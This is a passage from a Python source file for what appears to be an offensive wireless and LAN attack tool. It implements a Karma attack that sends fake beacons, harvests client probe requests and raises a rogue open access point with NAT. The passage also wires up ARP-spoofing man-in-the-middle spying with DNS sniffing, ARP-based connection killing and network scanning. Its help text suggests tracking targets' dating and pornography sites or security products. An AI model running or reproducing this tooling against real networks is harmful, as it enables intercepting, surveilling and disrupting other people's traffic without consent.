        print(f"[Channel {current_channel}] - " + ", ".join(active_ssids))

        print("\n[!] Detected probes ESSID Clients:")
        print(f"{'MAC Adress':<20} {'ESSID Probe':<30}")
        print("-" * 50)
        for mac, ssid in seen_clients:
            print(f"{mac:<20} {ssid:<30}")

        print("\n[!] Detected Probe Responses (APs responding):")
        print(f"{'AP MAC':<20} {'ESSID (responded to)':<30}")
        print("-" * 50)
        for mac, ssid in probe_responses_seen:
            print(f"{mac:<20} {ssid:<30}")

# Thread Beacon
def beacon_loop(INTERFACE):
    global active_ssids, current_channel
    while not stop_event.is_set():
        for channel in random.sample(CHANNEL_LIST, len(CHANNEL_LIST)):
            if stop_event.is_set():
                break
            current_channel = channel
            set_channel(INTERFACE, channel)

            for _ in range(3):
                if stop_event.is_set():
                    break
                batch = random.sample(ESSID_LIST, BROADCAST_BATCH_SIZE)
                active_ssids = [ssid for ssid in batch if ssid]

                start_time = time.time()
                while time.time() - start_time < DWELL_TIME:
                    if stop_event.is_set():
                        break
                    for ssid, mac in zip(active_ssids, FIXED_MACS):
                        frame = generate_beacon(ssid, mac)
                        sendp(frame, iface=INTERFACE, verbose=0)
                    display_status()
                    time.sleep(0.1)

# Handler Sniff
def karma_packet_handler(pkt):
    if pkt.haslayer(Dot11):
        dot11 = pkt.getlayer(Dot11)

        # --- Probe Request (subtype 4) or Association Request (subtype 0) ---
        if dot11.type == 0 and dot11.subtype in [0, 4]:
            client_mac = dot11.addr2
            ssid = None

            elt = pkt.getlayer(Dot11Elt)
            while elt:
                if elt.ID == 0:
                    try:
                        ssid = elt.info.decode(errors="ignore")
                    except:
                        break
                    break
                elt = elt.payload.getlayer(Dot11Elt)

            if ssid:
                entry = (client_mac, ssid)
                if entry not in seen_clients:
                    with display_lock:
                        seen_clients.add(entry)
                    display_status()

        # --- Probe Response (subtype 5) ---
        elif dot11.type == 0 and dot11.subtype == 5:
            ap_mac = dot11.addr2
            ssid = None

            elt = pkt.getlayer(Dot11Elt)
            while elt:
                if elt.ID == 0:
                    try:
                        ssid = elt.info.decode(errors="ignore")
                    except:
                        break
                    break
                elt = elt.payload.getlayer(Dot11Elt)

            if ssid:
                entry = (ap_mac, ssid)
                if entry not in probe_responses_seen:
                    with display_lock:
                        probe_responses_seen.add(entry)

# Thread Sniff
def sniff_loop(INTERFACE):
    sniff(iface=INTERFACE, prn=karma_packet_handler, store=0, stop_filter=lambda x: stop_event.is_set())


########################## START KARMA AP ##########################
def run(cmd):
    print(f"{G}[+] {RESET}{cmd}")
    subprocess.run(cmd, shell=True, check=True)

def backup(file):
    if os.path.exists(file) and not os.path.exists(file + BACKUP_SUFFIX):
        shutil.copy(file, file + BACKUP_SUFFIX)

def write_file(path, content):
    with open(path, 'w') as f:
        f.write(content)

def setup():
    print("[*] Saving conf files ...")
    backup(HOSTAPD_CONF)
    backup(DNSMASQ_CONF)
    backup(SYSCTL_CONF)

    print("[*] Configuring hostapd ...")
    write_file(HOSTAPD_CONF, f"""interface={karma_interface}
driver=nl80211
ssid={ESSID_fakeAP}
hw_mode=g
channel=6
auth_algs=1
ignore_broadcast_ssid=0
""")

    print("[*] Configuring dnsmasq ...")
    write_file(DNSMASQ_CONF, f"""interface={karma_interface}
dhcp-range=192.168.99.10,192.168.99.100,12h
""")

    print(f"[*] Preparing interface {karma_interface} ...")
    run(f"ip link set {karma_interface} down")
    run(f"ip addr flush dev {karma_interface}")
    run(f"ip addr add 192.168.99.1/24 dev {karma_interface}")
    run(f"ip link set {karma_interface} up")

    print("[*] Activating IP forwarding ...")
    run("sysctl -w net.ipv4.ip_forward=1")

    print("[*] Configuring NAT with iptables ...")
    run(f"iptables -t nat -A POSTROUTING -o {INTERNET_INTERFACE} -j MASQUERADE")
    run(f"iptables -A FORWARD -i {karma_interface} -o {INTERNET_INTERFACE} -j ACCEPT")
    run(f"iptables -A FORWARD -i {INTERNET_INTERFACE} -o {karma_interface} -m state --state ESTABLISHED,RELATED -j ACCEPT")

    print("[*] Launching hostapd and dnsmasq ...")
    run("systemctl start hostapd")
    run("systemctl start dnsmasq")

def get_default_gateway():
    gws = netifaces.gateways()
    default_gateway = gws.get('default')
    if default_gateway and netifaces.AF_INET in default_gateway:
        return default_gateway[netifaces.AF_INET][0]
    return None

########################## CONNECTED CLIENT KARMA AP ##########################
def is_reachable(ip):
    try:
        # Linux-style ping: -w 1 waits 1 second total for any reply
        result = subprocess.run(
            ["ping", "-w", "1", ip],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        return result.returncode == 0
    except Exception:
        return False

def monitor_connected_clients():
    print(f"[!] {Y}Monitoring connected clients ...{RESET}")
    print(f"[*] {Y}Listening ...{RESET}")

    client_status = {}  # mac -> "CONNECTED" or "DISCONNECTED"

    while True:
        try:
            if not os.path.exists(DNSMASQ_LEASES):
                print(f"{current_time()} {R}Fichier {DNSMASQ_LEASES} introuvable !{RESET}")
                return

            with open(DNSMASQ_LEASES, 'r') as f:
                lines = f.readlines()

            current_clients = {}  # Temp storage for current lease info

            for line in lines:
                parts = line.strip().split()
                if len(parts) >= 3:
                    mac = parts[1]
                    ip = parts[2]
                    hostname = parts[3] if len(parts) >= 4 else "?"
                    current_clients[mac] = (ip, hostname)

                    reachable = is_reachable(ip)
                    new_status = "CONNECTED" if reachable else "DISCONNECTED"
                    old_status = client_status.get(mac)

                    if old_status != new_status:
                        print(
                            f"{current_time()} {Y}→ CLient detected:{RESET} {mac} | IP: {R}{ip}{RESET} | Hostname: {hostname} "
                            f"→ {G if new_status == 'CONNECTED' else R}{new_status}{RESET}"
                        )
                        client_status[mac] = new_status
                else:
                    print(f"{current_time()} {R}Invalid record: {line.strip()}{RESET}")
            time.sleep(2)

        except KeyboardInterrupt:
            print("\n[!] Stopping client monitor")
            break

########################## KILL KARMA AP ##########################
def restore(file):
    if os.path.exists(file + BACKUP_SUFFIX):
        shutil.move(file + BACKUP_SUFFIX, file)

def cleanup(signal_received=None, frame=None):
    run("systemctl stop hostapd || true")
    run("systemctl stop dnsmasq || true")
    run("iptables -F")
    run("iptables -t nat -F")
    run(f"ip addr flush dev {karma_interface}")

    restore(HOSTAPD_CONF)
    restore(DNSMASQ_CONF)
    restore(SYSCTL_CONF)

    run("sysctl -w net.ipv4.ip_forward=0")

    if os.path.exists(DNSMASQ_LEASES):
        os.remove(DNSMASQ_LEASES)
        print(f"{G}[+] {RESET}Lease file {DNSMASQ_LEASES} deleted")

    print(f"{G}[+] {RESET}Default configuration files restored")

########################## MAIN ##########################
def main():
    global victim_ip, gateway_ip, iface_spy, start_iface, karma_interface, INTERNET_INTERFACE, ESSID_fakeAP, highlight_keywords_list, current_channel
    print(banner)
    parser = argparse.ArgumentParser(description="Silence reveals what noise conceals")
    parser.add_argument("--network", "-n", help="IP range to scan (e.g., 192.168.1.0/24)")
    parser.add_argument("--discovery", "-d", help="Identify devices connected to the --network IP range", action='store_true')
    parser.add_argument("--connect", "-c", help="Test access to the --network IP range", action='store_true')
    parser.add_argument("--listen", "-l", help="Passive listening of communications to discover network devices on --interface", action='store_true')
    parser.add_argument("--spy", "-s", help="Passive MITM with communication analysis (--target, --router, and --interface required)", action='store_true')
    parser.add_argument("--highlight", "-hi", help="Keywords to highlight during --spy observation (ex : --highlight tinder,badoo,grindr,pornhub or : --highlight sentinelone,crowdstrike,company)", type=str)
    parser.add_argument("--kill", "-k", help="Kill ARP connexion from target (--target, --router, and --interface required)", action='store_true')
    parser.add_argument("--target", "-t", help="Target IP to monitor")
    parser.add_argument("--router", "-r", help="Network router IP")
    parser.add_argument("--interface", "-i", help="Network interface to use (e.g., eth0)")
    parser.add_argument("--karma-scan", "-ks", help="Sniff probe requests and show ESSIDs + MACs with --karma-interface", action="store_true")
    parser.add_argument("--karma", "-ka", help="Setup fake OPEN AP (Insert probed ESSID from karma attack for exemple). --karma ESSID_NAME (need an other interface : --karma-interface). Use --kill-karma to end AP")
    parser.add_argument("--karma-listen", "-kl", help="Listen for connected client to your fake Karma AP", action="store_true")
    parser.add_argument("--kill-karma", "-kk", help="End Karma AP", action="store_true")
    parser.add_argument("--karma-interface", "-ki", help="Interface for fake AP or for karma-scan (--karma-interface wlan0)")
    parser.add_argument("--karma-interface-internet", "-kit", help="Interface with internet access for fake AP (--karma-interface-internet wlan1)")
    parser.add_argument("--usages", "-u", help="Show some exemples of use and how to debug", action='store_true')
    args = parser.parse_args()
    
    if len(sys.argv) == 1:
        parser.print_help()

    if args.usages:
        print(Debug_display)

    if args.highlight:
        highlight_keywords_list = [w.strip().lower() for w in args.highlight.split(",")]

    if args.karma:
        if not args.karma_interface:
            print(f"[!] {R}Missing argument: --karma-interface")
            exit(1)
        if not args.karma_interface_internet:
            print(f"[!] {R}Missing argument: --karma-interface-internet")
            exit(1)

        ESSID_fakeAP = args.karma
        INTERNET_INTERFACE = args.karma_interface_internet
        karma_interface = set_monitor_mode(args.karma_interface, "karma_on")
        with open("conf_file_lastseen_interface", "w") as f:
            f.write(karma_interface)

        setup()
        gateway_ip = get_default_gateway()
        print(f"[!] Router IP: {Y}{gateway_ip}{RESET}")
        print(f"[!] Client range network: {Y}192.168.99.0/24{RESET}")
        print(f"[!] Traffic AP: {Y}{karma_interface}{RESET}")
        print(f"[!] {Y}Karma AP running ...{RESET}")
        print(f"[!] Discover clients: {Y}sudo python silent_hill.py -d -n 192.168.99.0/24 --interface {karma_interface}{RESET}")
        print(f"[!] Spy on clients: {Y}sudo python silent_hill.py -s -i {karma_interface} -r {gateway_ip} -t <TARGET_IP>{RESET}")
        print(f"[!] Close Karma AP: {Y}sudo python silent_hill.py --kill-karma{RESET}\n")

    if args.karma_listen:
        monitor_connected_clients()

    if args.kill_karma:
        print(f"[*] Restauring last karma interface name: {karma_interface}")
        with open("conf_file_lastseen_interface", "r") as f:
            data = f.read()
        karma_interface = data

        print(f"[*] Stoping monitor mode")
        restore_interface(karma_interface, "karma_on")

        print(f"[*] Restoring default configs")
        cleanup()

        print(f"[*] CLeaning last files")
        os.remove("conf_file_lastseen_interface")

        print(f"[*] If you have some trouble to restore interface name try: {Y}sudo ip link set {karma_interface} name <ORIGINAL_NAME>{RESET}")

    if args.karma_scan:
        if not args.karma_interface:
            print(f"[!] {R}--karma-interface is required for --karma-scan")
            sys.exit(1)

        signal.signal(signal.SIGINT, signal_handler3)
        start_iface = set_monitor_mode(args.karma_interface, "karma_on")

        current_channel = 1
        thread_beacon = threading.Thread(target=beacon_loop, args=(start_iface,))
        thread_sniff = threading.Thread(target=sniff_loop, args=(start_iface,))
        thread_beacon.start()
        thread_sniff.start()
        thread_beacon.join()
        thread_sniff.join()


    if args.kill:
        if not args.target:
            print(f"[!] {R}Missing argument: --target")
            exit(1)
        if not args.router:
            print(f"[!] {R}Missing argument: --router")
            exit(1)
        if not args.interface:
            print(f"[!] {R}Missing argument: --interface")
            exit(1)

        victim_ip = args.target
        gateway_ip = args.router
        iface_spy = args.interface

        signal.signal(signal.SIGINT, signal_handler2)
        kill_connection()

    if args.spy:
        if not args.target:
            print(f"[!] {R}Missing argument: --target")
            exit(1)
        if not args.router:
            print(f"[!] {R}Missing argument: --router")
            exit(1)
        if not args.interface:
            print(f"[!] {R}Missing argument: --interface")
            exit(1)

        victim_ip = args.target
        gateway_ip = args.router
        iface_spy = args.interface

        signal.signal(signal.SIGINT, signal_handler)
        enable_ip_forwarding()
        threading.Thread(target=spoof, daemon=True).start()
        sniff_dns()

    if args.listen:
        if not args.interface:
            print(f"[!] {R}No --interface defined ...{RESET}")
            sys.exit(0)
        else:
            signal.signal(signal.SIGINT, signal_handler)
            print(f"[*] {Y}Passive sniffing in progress on {args.interface} ... (CTRL+C to stop){RESET}")
            threading.Thread(target=print_summary, daemon=True).start()
            sniff(prn=packet_handler, store=False, iface=args.interface)

    if args.connect:
        signal.signal(signal.SIGINT, signal_handler)
        print(f"[*] {Y}Scanning in progress on {args.network} ...{RESET}")
        start_time = time.time()
        threads = []

        for ip in ipaddress.IPv4Network(args.network):
            t = threading.Thread(target=scan_host, args=(ip,))
            threads.append(t)
            t.start()

            while threading.active_count() > 100:
                time.sleep(0.01)

        for t in threads:
            t.join()

        duration = time.time() - start_time
        print(f"\n{C}=== Summary of detected hosts ==={RESET}")
        for ip, ports, services, infos in found_hosts:
            for p, s, info in zip(ports, services, infos):
                print(f"{ip}:{p} ({s}) --> {info}")
        print(f"\n{Y}Total time: {RESET}{duration:.1f}s")

    if args.discovery:
        signal.signal(signal.SIGINT, signal_handler)
        print("[*] Loading OUI database from oui.txt")
        oui_map = load_oui("oui.txt")
        if not oui_map:
            print(f"[!] {R}OUI database empty or not found{RESET}")

        devices_arp = arp_scan(args.network, args.interface, oui_map)
        ips_arp = {d['ip'] for d in devices_arp}

        for device in devices_arp:
            hostname = device.get('hostname')
            if not hostname or hostname.strip() == device['ip']:
                name, mac = get_netbios_info(device['ip'])
                if name:
                    device['hostname'] = name
                if mac and not device.get('mac'):
                    device['mac'] = mac
                if mac:
                    device['vendor'] = get_vendor(mac, oui_map)

        if '/' in args.network:
            ssdp_hosts = ssdp_discover()
            for ip in ssdp_hosts:
                if ip not in ips_arp:
                    hostname = get_hostname(ip)
                    devices_arp.append({
                        'ip': ip,
                        'mac': None,
                        'vendor': None,
                        'hostname': hostname or "?"
                    })

        alive_icmp = icmp_scan(args.network)
        for ip in alive_icmp:
            if ip not in ips_arp:
                hostname = get_hostname(ip)
                mac = None
                if not hostname:
                    hostname, mac = get_netbios_info(ip)
                    if not hostname:
                        sysinfo = get_snmp_sysinfo(ip)
                        if sysinfo:
                            hostname = sysinfo.split(":")[-1].strip()
                    if not hostname:
                        if tcp_syn_scan(ip):
                            print(f"{G}[+]{RESET} TCP SYN active on {Y}{ip}{RESET}")
                devices_arp.append({
                    'ip': ip,
                    'mac': mac,
                    'vendor': get_vendor(mac, oui_map) if mac else None,
                    'hostname': hostname or "?"
                })

        print(f"\n{G}[+]{RESET} Hosts detected ({Y}{len(devices_arp)}{RESET}):")
        for i, d in enumerate(devices_arp, 1):
            mac = d['mac'] if d['mac'] else "N/A"
            vendor = d['vendor'] if d['vendor'] else "Unknown"
            hostname = d['hostname'] if d.get('hostname') else "?"
            print(f"{i}. {Y}{d['ip']:15}{RESET} [{mac}] ({Y}{vendor}{RESET})  --> {C}{hostname}{RESET}")

if __name__ == "__main__":
    main()
